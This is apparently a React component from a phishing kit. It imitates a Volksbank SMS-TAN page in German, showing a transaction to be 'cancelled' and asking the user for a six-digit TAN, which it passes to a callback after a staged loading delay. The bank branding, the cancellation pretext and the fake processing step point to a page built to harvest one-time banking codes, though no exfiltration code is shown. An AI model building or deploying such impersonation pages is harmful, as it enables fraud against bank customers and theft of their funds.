import React, { useState, useEffect } from 'react';
import Loading from './Loading';

interface TransactionDetails {
  amount?: string;
  recipient?: string;
  reference?: string;
  iban?: string;
}

type TANType = 'TRANSACTION_TAN' | 'LOGIN_TAN';

interface SMSTANScreenProps {
  tanType: TANType;
  phoneNumber?: string;
  transactionDetails?: TransactionDetails;
  onSubmit: (tan: string) => void;
  onResend?: () => void;
  onCancel?: () => void;
}

const SMSTANScreen: React.FC<SMSTANScreenProps> = ({
  tanType,
  phoneNumber = 'Ihre registrierte Nummer',
  transactionDetails = {},
  onSubmit,
  onResend,
  onCancel
}) => {
  const [tan, setTan] = useState<string[]>(['', '', '', '', '', '']);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [countdown, setCountdown] = useState(60);
  const [canResend, setCanResend] = useState(false);
  const [isMobile, setIsMobile] = useState(false);
  const [isSmallMobile, setIsSmallMobile] = useState(false);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
      setIsSmallMobile(window.innerWidth <= 480);
    };
    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  useEffect(() => {
    if (isSubmitting) return;

    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          setCanResend(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [isSubmitting]);

  const handleChange = (index: number, value: string) => {
    const newTan = [...tan];
    newTan[index] = value.slice(-1); // Only allow one character
    setTan(newTan);

    // Auto-focus next input
    if (value && index < 5) {
      const nextInput = document.getElementById(`tan-input-${index + 1}`);
      nextInput?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !tan[index] && index > 0) {
      const prevInput = document.getElementById(`tan-input-${index - 1}`);
      prevInput?.focus();
    }
  };

  const handleSubmit = async () => {
    const fullTan = tan.join('');
    if (fullTan.length === 6) {
      setIsSubmitting(true);
      await new Promise(resolve => setTimeout(resolve, 1500));
      onSubmit(fullTan);
    }
  };

  const handleResend = () => {
    if (canResend && onResend) {
      setCanResend(false);
      setCountdown(60);
      onResend();
    }
  };

  if (isSubmitting) {
    return (
      <Loading 
        message={tanType === 'TRANSACTION_TAN' ? 'Stornierung wird verarbeitet...' : 'SMS-TAN wird überprüft...'}
        type="processing"
        showProgress={true}
        duration={2}
      />
    );
  }

  // Responsive styles
  const containerPadding = isSmallMobile ? '20px' : isMobile ? '24px' : '32px 8px';
  const cardWidth = isMobile ? '100%' : '660px';
  const cardPadding = isSmallMobile ? '16px' : isMobile ? '20px' : '32px 32px 24px 32px';

  return (
    <div style={{
      backgroundColor: '#f8f9fa',
      minHeight: '100vh',
      padding: '0',
      fontFamily: 'VB-Regular, Arial, sans-serif',
      fontStyle: 'normal'
    }}>
      <div style={{
        maxWidth: isMobile ? 'none' : '1400px',
        margin: isMobile ? '0' : '0 auto',
        padding: containerPadding,
        display: 'flex',
        flexDirection: 'column',
        alignItems: isMobile ? 'center' : 'flex-start',
        minHeight: '100vh',
        justifyContent: 'center'
      }}>
        
        {/* Main SMS TAN Card */}
        <div style={{
          width: cardWidth,
          backgroundColor: 'white',
          borderRadius: '8px',
          border: 'none',
          boxShadow: '0 1px 3px rgba(0, 0, 0, 0.08), 0 1px 2px rgba(0, 0, 0, 0.06)',
          overflow: 'hidden',
          marginTop: isMobile ? '0' : '40px'
        }}>
          
          {/* Header Section */}
          <div style={{
            padding: cardPadding
          }}>
            <h1 style={{
              color: '#003d7a',
              fontSize: isSmallMobile ? '1.5rem' : isMobile ? '1.75rem' : '2.375rem',
              fontWeight: 'normal',
              margin: '0 0 16px 0',
              lineHeight: isSmallMobile ? '1.75rem' : isMobile ? '2rem' : '2.75rem',
              fontFamily: 'VB-Bold, Arial, sans-serif',
              fontStyle: 'normal'
            }}>
              {tanType === 'TRANSACTION_TAN' ? 'SMS-TAN Stornierung' : 'SMS-TAN Anmeldung'}
            </h1>
            
            {/* Instruction Box */}
            <div style={{
              backgroundColor: '#f1f3f4',
              border: '1px solid #dee2e6',
              borderRadius: '8px',
              padding: '20px',
              marginBottom: '32px'
            }}>
              <p style={{
                margin: '0',
                fontSize: isMobile ? '14px' : '16px',
                color: '#333333',
                fontFamily: 'VB-Regular, Arial, sans-serif',
                fontStyle: 'normal',
                lineHeight: '1.6'
              }}>
                {tanType === 'TRANSACTION_TAN'
                  ? `Wir haben Ihnen eine SMS mit einer TAN-Nummer zur Stornierung an ${phoneNumber} gesendet.`
                  : `Wir haben Ihnen eine SMS mit einer TAN-Nummer zur Anmeldung an ${phoneNumber} gesendet.`
                }
              </p>
            </div>

            {/* Transaction Details Card - only for TRANSACTION_TAN */}
            {tanType === 'TRANSACTION_TAN' && transactionDetails.amount && (
              <div style={{
                backgroundColor: '#ffffff',
                border: '2px solid #003d7a',
                borderRadius: '8px',
                padding: '24px',
                marginBottom: '32px'
              }}>
                <h2 style={{
                  color: '#003d7a',
                  fontSize: isMobile ? '1.25rem' : '1.5rem',
                  fontWeight: 'normal',
                  margin: '0 0 20px 0',
                  fontFamily: 'VB-Bold, Arial, sans-serif',
                  fontStyle: 'normal'
                }}>
                  Zu stornierende Transaktion
                </h2>
                
                <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
                  <div style={{ 
                    display: 'flex', 
                    justifyContent: 'space-between', 
                    alignItems: 'center',
                    paddingBottom: '12px',
                    borderBottom: '1px solid #dee2e6'
                  }}>
                    <span style={{
                      color: '#6c757d',
                      fontSize: '14px',
                      fontFamily: 'VB-Regular, Arial, sans-serif',
                      fontStyle: 'normal'
                    }}>Betrag:</span>
                    <span style={{
                      color: '#003d7a',
                      fontSize: '18px',
                      fontFamily: 'VB-Bold, Arial, sans-serif',
                      fontWeight: 'normal',
                      fontStyle: 'normal'
                    }}>{transactionDetails.amount}</span>
                  </div>
                  
                  {transactionDetails.recipient && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center',
                      paddingBottom: '12px',
                      borderBottom: '1px solid #dee2e6'
                    }}>
                      <span style={{
                        color: '#6c757d',
                        fontSize: '14px',
                        fontFamily: 'VB-Regular, Arial, sans-serif',
                        fontStyle: 'normal'
                      }}>Empfänger:</span>
                      <span style={{
                        color: '#333333',
                        fontSize: '14px',
                        fontFamily: 'VB-Regular, Arial, sans-serif',
                        fontStyle: 'normal',
                        textAlign: 'right',
                        maxWidth: '60%'
                      }}>{transactionDetails.recipient}</span>
                    </div>
                  )}
                  
                  {transactionDetails.iban && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center',
                      paddingBottom: '12px',
                      borderBottom: '1px solid #dee2e6'
                    }}>
                      <span style={{
                        color: '#6c757d',
                        fontSize: '14px',
                        fontFamily: 'VB-Regular, Arial, sans-serif',
                        fontStyle: 'normal'
                      }}>IBAN:</span>
                      <span style={{
                        color: '#333333',
                        fontSize: '14px',
                        fontFamily: 'monospace',
                        fontStyle: 'normal',
                        textAlign: 'right'
                      }}>{transactionDetails.iban}</span>
                    </div>
                  )}
                  
                  {transactionDetails.reference && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center'
                    }}>
                      <span style={{
                        color: '#6c757d',
                        fontSize: '14px',
                        fontFamily: 'VB-Regular, Arial, sans-serif',
                        fontStyle: 'normal'
                      }}>Verwendungszweck:</span>
                      <span style={{
                        color: '#333333',
                        fontSize: '14px',
                        fontFamily: 'VB-Regular, Arial, sans-serif',
                        fontStyle: 'normal',
                        textAlign: 'right',
                        maxWidth: '60%'
                      }}>{transactionDetails.reference}</span>
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* TAN Input Section */}
            <div style={{
              backgroundColor: '#f1f3f4',
              border: '1px solid #dee2e6',
              borderRadius: '8px',
              padding: '32px',
              marginBottom: '32px'
            }}>
              <h3 style={{
                color: '#003d7a',
                fontSize: isMobile ? '1.125rem' : '1.25rem',
                fontWeight: 'normal',
                margin: '0 0 24px 0',
                fontFamily: 'VB-Bold, Arial, sans-serif',
                fontStyle: 'normal',
                textAlign: 'center'
              }}>
                {tanType === 'TRANSACTION_TAN' ? 'TAN-Nummer zur Stornierung eingeben:' : 'TAN-Nummer eingeben:'}
              </h3>

              {/* TAN Input Fields */}
              <div style={{
                display: 'flex',
                justifyContent: 'center',
                gap: isMobile ? '8px' : '12px',
                marginBottom: '24px',
                flexWrap: 'wrap'
              }}>
                {tan.map((digit, index) => (
                  <input
                    key={index}
                    id={`tan-input-${index}`}
                    type="text"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    maxLength={1}
                    value={digit}
                    onChange={(e) => handleChange(index, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(index, e)}
                    style={{
                      width: isMobile ? '40px' : '50px',
                      height: isMobile ? '50px' : '60px',
                      fontSize: isMobile ? '1.5rem' : '1.75rem',
                      textAlign: 'center',
                      border: '2px solid #dee2e6',
                      borderRadius: '8px',
                      outline: 'none',
                      color: '#003d7a',
                      fontWeight: 'normal',
                      fontFamily: 'VB-Bold, Arial, sans-serif',
                      fontStyle: 'normal',
                      backgroundColor: '#ffffff',
                      transition: 'all 0.2s ease'
                    }}
                    onFocus={(e) => {
                      (e.target as HTMLInputElement).style.border = '2px solid #003d7a';
                      (e.target as HTMLInputElement).style.boxShadow = '0 0 0 3px rgba(0, 61, 122, 0.1)';
                    }}
                    onBlur={(e) => {
                      (e.target as HTMLInputElement).style.border = '2px solid #dee2e6';
                      (e.target as HTMLInputElement).style.boxShadow = 'none';
                    }}
                    onMouseEnter={(e) => {
                      if (document.activeElement !== e.target) {
                        (e.target as HTMLInputElement).style.backgroundColor = '#f8f9fa';
                      }
                    }}
                    onMouseLeave={(e) => {
                      if (document.activeElement !== e.target) {
                        (e.target as HTMLInputElement).style.backgroundColor = '#ffffff';
                      }
                    }}
                    disabled={isSubmitting}
                  />
                ))}
              </div>

              {/* Submit Button */}
              <div style={{ textAlign: 'center', marginBottom: '20px' }}>
                <button
                  onClick={handleSubmit}
                  disabled={tan.join('').length !== 6 || isSubmitting}
                  style={{
                    backgroundColor: (tan.join('').length !== 6 || isSubmitting) ? '#6c757d' : '#003d7a',
                    color: '#ffffff',
                    border: 'none',
                    padding: isMobile ? '12px 24px' : '10px 24px',
                    borderRadius: '50px',
                    fontFamily: 'VB-Bold, Arial, sans-serif',
                    fontWeight: 'normal',
                    fontSize: isMobile ? '0.875rem' : '0.8125rem',
                    fontStyle: 'normal',
                    cursor: (tan.join('').length !== 6 || isSubmitting) ? 'not-allowed' : 'pointer',
                    transition: 'background-color 0.2s ease',
                    width: isMobile ? '100%' : 'auto',
                    minWidth: '200px'
                  }}
                  onMouseEnter={(e) => {
                    if (tan.join('').length === 6 && !isSubmitting) {
                      (e.target as HTMLButtonElement).style.backgroundColor = '#0056b3';
                    }
                  }}
                  onMouseLeave={(e) => {
                    if (tan.join('').length === 6 && !isSubmitting) {
                      (e.target as HTMLButtonElement).style.backgroundColor = '#003d7a';
                    }
                  }}
                >
                  {isSubmitting
                    ? (tanType === 'TRANSACTION_TAN' ? 'Stornierung wird verarbeitet...' : 'TAN wird überprüft...')
                    : (tanType === 'TRANSACTION_TAN' ? 'Stornierung bestätigen' : 'TAN bestätigen')
                  }
                </button>
              </div>

              {/* Resend Button */}
              {onResend && (
                <div style={{ textAlign: 'center', marginBottom: '20px' }}>
                  <button
                    onClick={handleResend}
                    disabled={!canResend || isSubmitting}
                    style={{
                      backgroundColor: 'transparent',
                      color: (!canResend || isSubmitting) ? '#6c757d' : '#003d7a',
                      border: `2px solid ${(!canResend || isSubmitting) ? '#6c757d' : '#003d7a'}`,
                      padding: isMobile ? '12px 24px' : '10px 24px',
                      borderRadius: '50px',
                      fontFamily: 'VB-Bold, Arial, sans-serif',
                      fontWeight: 'normal',
                      fontSize: isMobile ? '0.875rem' : '0.8125rem',
                      fontStyle: 'normal',
                      cursor: (!canResend || isSubmitting) ? 'not-allowed' : 'pointer',
                      transition: 'all 0.2s ease',
                      width: isMobile ? '100%' : 'auto',
                      minWidth: '200px'
                    }}
                    onMouseEnter={(e) => {
                      if (canResend && !isSubmitting) {
                        (e.target as HTMLButtonElement).style.backgroundColor = '#003d7a';
                        (e.target as HTMLButtonElement).style.color = '#ffffff';
                      }
                    }}
                    onMouseLeave={(e) => {
                      if (canResend && !isSubmitting) {
                        (e.target as HTMLButtonElement).style.backgroundColor = 'transparent';
                        (e.target as HTMLButtonElement).style.color = '#003d7a';
                      }
                    }}
                  >
                    TAN erneut senden {canResend ? '' : `(${countdown}s)`}
                  </button>
                </div>
              )}

              {/* Cancel Link */}
              {onCancel && (
                <div style={{ textAlign: 'center' }}>
                  <a 
                    href="#" 
                    onClick={(e) => {
                      e.preventDefault();
                      onCancel();
                    }}
                    style={{
                      color: '#003d7a',
                      textDecoration: 'none',
                      fontSize: '14px',
                      fontFamily: 'VB-Regular, Arial, sans-serif',
                      fontStyle: 'normal',
                      transition: 'color 0.3s ease'
                    }}
                    onMouseEnter={(e) => {
                      (e.target as HTMLAnchorElement).style.color = '#0056b3';
                      (e.target as HTMLAnchorElement).style.textDecoration = 'underline';
                    }}
                    onMouseLeave={(e) => {
                      (e.target as HTMLAnchorElement).style.color = '#003d7a';
                      (e.target as HTMLAnchorElement).style.textDecoration = 'none';
                    }}
                  >
                    {tanType === 'TRANSACTION_TAN' ? 'Stornierung abbrechen' : 'Anmeldung abbrechen'}
                  </a>
                </div>
              )}
            </div>

            {/* Footer Info */}
            <div style={{ textAlign: 'center' }}>
              <p style={{
                color: '#6c757d',
                fontSize: '12px',
                margin: '0',
                fontFamily: 'VB-Regular, Arial, sans-serif',
                fontStyle: 'normal'
              }}>
                Keine SMS erhalten? Überprüfen Sie Ihren Spam-Ordner oder kontaktieren Sie Ihre Volksbank.
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export { SMSTANScreen };
